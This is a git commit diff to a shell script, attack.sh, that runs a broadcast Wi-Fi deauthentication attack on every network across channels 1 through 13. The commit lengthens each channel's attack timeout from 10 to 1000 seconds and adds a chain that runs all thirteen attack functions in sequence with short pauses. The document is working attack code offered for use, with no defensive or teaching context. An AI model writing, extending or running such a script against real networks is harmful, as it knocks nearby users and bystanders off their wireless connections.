fc82b1108bcd887194e1bfb35cb307e971455577
MR-Binaryum <133718570+MR-Binaryum@users.noreply.github.com>
2024-07-13 18:55:14 +0000

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -10,7 +10,7 @@ echo "put youre interface name in monitor mode in the next input"
 attack1(){
 echo "Starting Deauth attack by broadcast in all networks from channel 1" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 1 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 1 $wifiInterfaceMon &
 
 file="APs1.txt"
 
@@ -26,7 +26,7 @@ fi
 attack2(){
 echo "Starting Deauth attack by broadcast in all networks from channel 2" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 2 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 2 $wifiInterfaceMon &
 
 file="APs2.txt"
 
@@ -42,7 +42,7 @@ fi
 attack3(){
 echo "Starting Deauth attack by broadcast in all networks from channel 3" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 3 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 3 $wifiInterfaceMon &
 
 file="APs3.txt"
 
@@ -58,7 +58,7 @@ fi
 attack4(){
 echo "Starting Deauth attack by broadcast in all networks from channel 4" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 4 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 4 $wifiInterfaceMon &
 
 file="APs4.txt"
 
@@ -74,7 +74,7 @@ fi
 attack5(){
 echo "Starting Deauth attack by broadcast in all networks from channel 5" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 5 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 5 $wifiInterfaceMon &
 
 file="APs5.txt"
 
@@ -90,7 +90,7 @@ fi
 attack6(){
 echo "Starting Deauth attack by broadcast in all networks from channel 6" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 6 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 6 $wifiInterfaceMon &
 
 file="APs6.txt"
 
@@ -106,7 +106,7 @@ fi
 attack7(){
 echo "Starting Deauth attack by broadcast in all networks from channel 7" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 7 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 7 $wifiInterfaceMon &
 
 file="APs7.txt"
 
@@ -122,7 +122,7 @@ fi
 attack8(){
 echo "Starting Deauth attack by broadcast in all networks from channel 8" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 8 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 8 $wifiInterfaceMon &
 
 file="APs8.txt"
 
@@ -138,7 +138,7 @@ fi
 attack9(){
 echo "Starting Deauth attack by broadcast in all networks from channel 9" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 9 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 9 $wifiInterfaceMon &
 
 file="APs9.txt"
 
@@ -154,7 +154,7 @@ fi
 attack10(){
 echo "Starting Deauth attack by broadcast in all networks from channel 10" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 10 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 10 $wifiInterfaceMon &
 
 file="APs10.txt"
 
@@ -170,7 +170,7 @@ fi
 attack11(){
 echo "Starting Deauth attack by broadcast in all networks from channel 11" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 11 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 11 $wifiInterfaceMon &
 
 file="APs11.txt"
 
@@ -186,7 +186,7 @@ fi
 attack12(){
 echo "Starting Deauth attack by broadcast in all networks from channel 12" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 12 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 12 $wifiInterfaceMon &
 
 file="APs12.txt"
 
@@ -202,7 +202,7 @@ fi
 attack13(){
 echo "Starting Deauth attack by broadcast in all networks from channel 13" &
 
-sudo timeout 10s $Tool -e "$AirDumper" -c 13 $wifiInterfaceMon &
+sudo timeout 1000s $Tool -e "$AirDumper" -c 13 $wifiInterfaceMon &
 
 file="APs13.txt"
 
@@ -215,3 +215,18 @@ done < "$file"
 fi
 }
 
+vars="sleep 5"
+
+attack1 && $vars &&
+attack2 && $vars &&
+attack3 && $vars &&
+attack4 && $vars &&
+attack5 && $vars &&
+attack6 && $vars &&
+attack7 && $vars &&
+attack8 && $vars &&
+attack9 && $vars &&
+attack10 && $vars &&
+attack11 && $vars &&
+attack12 && $vars &&
+attack13 && $vars
